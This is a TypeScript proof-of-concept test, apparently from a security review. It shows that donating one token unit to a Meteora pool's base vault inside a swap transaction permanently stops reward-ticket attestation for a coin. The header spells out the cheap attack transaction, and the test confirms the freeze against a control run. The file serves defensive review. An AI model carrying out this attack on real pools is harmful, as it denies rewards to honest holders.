/**
 * PoC V7-H2 (vault donation): anyone can permanently stop ticket attestation for any coin with one cheap tx.
 *
 * Tx = [any swap on the coin's DBC (or DAMM v2) pool] + [Token-2022 TransferChecked of 1 base unit
 * from the attacker's account INTO the pool's base vault]. Token accounts accept transfers from anyone.
 *  - parse.ts:232-246: the vault's observed delta (event + 1) != event delta -> the swap is rejected and an
 *    issue `vault_mismatch` is emitted WITHOUT a `pool` field.
 *  - history.ts:111-114: an issue without pool counts when the tx touches our pool -> `parse_issue` event.
 *  - engine.ts:198-201: `inconsistent = true` is sticky -> every later sell of the coin, forever, gets
 *    `history_inconsistent`; records.ts:47-52 additionally never signs anything at/after the issue slot.
 * Every honest keeper and the watcher compute the same thing, so the coin's reward program is dead.
 * The same happens for a sell where the trader deliberately sends dust to the vault (no need to own
 * anything but 1 token unit), for an account whose owner was changed with SetAuthority (negative
 * balance, owner-change-negative-balance.test.ts), and for any engine `issue` at all (cutoff).
 *
 * The tx is simulated by editing the token-balance metadata of a real mainnet DBC sell fixture exactly
 * as the extra TransferChecked would (seller -1, base vault +1); the parser never reads non-Meteora
 * instructions, so adding the instruction itself changes nothing for it.
 *
 * Run (from services/):  node --import tsx --test ../security-review/v07-poc/vault-donation-freeze.test.ts
 */
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { it } from "node:test";

import { Keypair } from "@solana/web3.js";
import bs58 from "bs58";

import { buildEvents, DEFAULT_ENGINE_PARAMS, runEngine } from "../../services/engine/src/index.ts";
import { usd150, Tape, SOL } from "../../services/engine/test/helpers.ts";
import { type ConfirmedTx, parseMeteoraTrades } from "../../services/meteora/src/index.ts";
import { candidates } from "../../services/keeper/src/attest/records.ts";

const fixture = (n: string): ConfirmedTx =>
  JSON.parse(readFileSync(new URL(`../../services/meteora/test/fixtures/${n}.json`, import.meta.url), "utf8")) as ConfirmedTx;

it("1 base unit donated to the vault in a swap tx freezes the coin for good", () => {
  const tx = fixture("dbc_direct_sell");
  const honest = parseMeteoraTrades(tx);
  assert.equal(honest.trades.length, 1);
  assert.deepEqual(honest.issues, []);
  const trade = honest.trades[0];

  // + TransferChecked(seller ATA -> base vault, 1 unit)
  const evil = JSON.parse(JSON.stringify(tx)) as ConfirmedTx;
  const keys = (evil.transaction.message as { accountKeys: string[] }).accountKeys;
  const post = evil.meta!.postTokenBalances!;
  const sellerAcc = post.find((b) => keys[b.accountIndex] === trade.inputTokenAccount)!;
  const vaultAcc = post.find((b) => b.owner === "FhVo3mqL8PW5pH5U2CN4XE33DokiyZnUwuGpH2hmHLuM" && b.mint === trade.baseMint)!;
  sellerAcc.uiTokenAmount.amount = String(BigInt(sellerAcc.uiTokenAmount.amount) - 1n);
  vaultAcc.uiTokenAmount.amount = String(BigInt(vaultAcc.uiTokenAmount.amount) + 1n);

  const r = parseMeteoraTrades(evil);
  assert.equal(r.trades.length, 0, "swap rejected");
  assert.equal(r.issues[0].code, "vault_mismatch");
  assert.equal(r.issues[0].pool, undefined, "issue carries no pool");

  // The coin's history: an honest holder A bought long before; the attacker's tx; A sells afterwards.
  const coinFacts = {
    mint: trade.baseMint,
    creator: Keypair.generate().publicKey.toBase58(),
    dbcPool: trade.pool,
    config: trade.config!,
    startSqrtPrice: 1n << 59n,
    launchBlockTime: tx.blockTime! - 86_400,
    launchSlot: tx.slot - 200_000,
    dammPool: null,
  };
  const evs = buildEvents(coinFacts, [{ tx: evil, txIndex: -1 }]);
  const pi = evs.find((e) => e.kind === "parse_issue");
  assert.ok(pi, "buildEvents turns it into a parse_issue for our coin");

  const A = Keypair.generate().publicKey.toBase58();
  const t = new Tape(tx.blockTime! - 3_600);
  t.slot = tx.slot - 9_000;
  t.buy(A, 10n * SOL, { pool: trade.pool, signature: bs58.encode(Keypair.generate().secretKey) });
  t.wait(7_200);
  t.slot = tx.slot + 1_000; // after the attack
  const sellSig = t.sell(A, 2n * SOL, { pool: trade.pool, signature: bs58.encode(Keypair.generate().secretKey) });
  // Same holder/sell without the attack would get a ticket:
  const control = runEngine({ ...coinFacts }, t.events, DEFAULT_ENGINE_PARAMS, usd150);
  assert.ok(control.done && control.output.sells.find((s) => s.signature === sellSig)!.ticket, "control: ticket");

  const res = runEngine({ ...coinFacts }, [...t.events, pi!], DEFAULT_ENGINE_PARAMS, usd150);
  assert.ok(res.done);
  const sell = res.output.sells.find((s) => s.signature === sellSig)!;
  assert.equal(sell.ticket, null);
  assert.equal(sell.reason, "history_inconsistent");
  const c = candidates(coinFacts.mint, res.output, { clusterTag: 0, now: t.t + 60, maxAttestAgeSecs: 86_400 });
  assert.equal(c.length, 0, "nothing will ever be signed for this coin again");
});
